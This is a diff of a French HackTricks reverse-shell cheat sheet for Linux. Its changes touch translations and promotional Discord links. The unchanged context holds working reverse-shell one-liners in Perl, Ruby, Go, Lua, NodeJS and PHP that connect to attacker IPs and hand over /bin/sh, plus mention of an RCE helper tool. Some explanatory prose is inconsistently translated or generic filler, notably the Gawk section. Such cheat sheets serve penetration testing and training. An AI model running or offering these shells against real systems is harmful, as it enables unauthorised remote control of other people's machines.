@@ -4,9 +4,9 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks:
+Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -14,9 +14,17 @@ Autres façons de soutenir HackTricks:
 
 </details>
 
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 **Si vous avez des questions sur l'un de ces shells, vous pouvez les vérifier avec** [**https://explainshell.com/**](https://explainshell.com)
 
-## Full TTY
+## TTY complet
 
 **Une fois que vous avez obtenu un shell inversé**[ **lisez cette page pour obtenir un TTY complet**](full-ttys.md)**.**
 
@@ -63,7 +71,7 @@ Lorsqu'il s'agit d'une vulnérabilité d'**Exécution de Code à Distance (RCE)*
 
 Un outil recommandé à cette fin est [toboggan](https://github.com/n3rada/toboggan.git), qui simplifie l'interaction avec l'environnement cible.
 
-Pour utiliser toboggan efficacement, créez un module Python adapté au contexte RCE de votre système cible. Par exemple, un module nommé `nix.py` pourrait être structuré comme suit:
+Pour utiliser toboggan efficacement, créez un module Python adapté au contexte de RCE de votre système cible. Par exemple, un module nommé `nix.py` pourrait être structuré comme suit:
 ```python3
 import jwt
 import httpx
@@ -102,7 +110,7 @@ Il vous suffit de modifier :
 * Le préfixe et le suffixe de votre charge utile (le cas échéant)
 * La manière dont la charge utile est envoyée (en-têtes ? données ? informations supplémentaires ?)
 
-Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les tubes sont lus et écrits avec un délai approximatif de 1,3s).
+Ensuite, vous pouvez simplement **envoyer des commandes** ou même **utiliser la commande `upgrade`** pour obtenir un PTY complet (notez que les pipes sont lus et écrits avec un délai approximatif de 1,3s).
 
 ## Netcat
 ```bash
@@ -149,21 +157,19 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration tasks, web development, and network programming. Perl scripts can be used for various hacking tasks, such as automating repetitive tasks, manipulating data, and creating custom tools.
+Perl est un langage de script polyvalent et puissant couramment utilisé pour l'automatisation de tâches, le traitement de texte et la manipulation de fichiers. Il est également largement utilisé dans le domaine de la sécurité informatique pour diverses tâches, telles que l'analyse de fichiers journaux, la manipulation de données et la création d'outils personnalisés. Perl offre une grande flexibilité et une grande capacité à interagir avec le système d'exploitation, ce qui en fait un outil précieux pour les professionnels de la sécurité informatique.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-Ruby is a dynamic, open-source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is commonly used for web development, automation, and scripting. It is known for its flexibility and is often used in the development of web applications and software tools.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
 
-PHP (Hypertext Preprocessor) is a widely-used open source general-purpose scripting language that is especially suited for web development and can be embedded into HTML. It is executed on the server side, meaning that the code is processed on the server before being sent to the client's web browser. PHP can perform various tasks such as collecting form data, generating dynamic page content, sending and receiving cookies, and more. It is compatible with many databases, including MySQL, PostgreSQL, Oracle, and others. PHP is known for its flexibility, ease of use, and strong community support.
+PHP (Hypertext Preprocessor) is a widely-used open source general-purpose scripting language that is especially suited for web development and can be embedded into HTML. It is executed on the server side, meaning that the code is processed on the server before being sent to the client's web browser. PHP can perform various tasks such as collecting form data, generating dynamic page content, sending and receiving cookies, and more. It is commonly used in combination with MySQL databases to create powerful and dynamic web applications.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -191,6 +197,8 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua est un langage de script léger et puissant. Il est souvent utilisé pour l'automatisation, l'extension d'applications et le prototypage rapide. Lua peut être intégré dans des applications plus larges pour offrir une plus grande flexibilité et personnalisation.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -198,6 +206,8 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## NodeJS
+
+NodeJS est une plateforme open-source basée sur le moteur JavaScript V8 de Google Chrome, qui permet d'exécuter du code JavaScript côté serveur. NodeJS est largement utilisé pour créer des applications web rapides et évolutives.
 ```javascript
 (function(){
 var net = require("net"),
@@ -290,7 +300,27 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk est un langage de programmation qui est souvent utilisé pour le traitement de fichiers texte. Il est très puissant et flexible, et il est souvent utilisé par les hackers pour manipuler des données et automatiser des tâches. Gawk peut être utilisé pour extraire des informations spécifiques à partir de fichiers texte, effectuer des calculs, et bien plus encore. Il est un outil polyvalent qui peut être très utile lors de l'analyse de données ou de la manipulation de fichiers texte dans le cadre de tests d'intrusion.
+### Introduction
+
+Gawk is a powerful programming language that is particularly useful for handling data extraction and reporting tasks. It is often used in combination with shell scripts to process text files and manipulate data.
+
+### Basic Usage
+
+To use Gawk, you can simply run the `gawk` command followed by the script file you want to execute. For example:
+
+```bash
+gawk -f script.awk data.txt
+```
+
+This command will execute the `script.awk` script on the `data.txt` file.
+
+### AWK Scripts
+
+AWK scripts are written in a specific syntax that allows for pattern scanning and processing. These scripts can be used to extract specific data from files, perform calculations, and generate reports.
+
+### Conclusion
+
+Gawk is a versatile tool that can be used for a wide range of data processing tasks. By mastering Gawk, you can efficiently manipulate and extract data from text files, making it a valuable asset in your hacking toolkit.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -341,6 +371,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
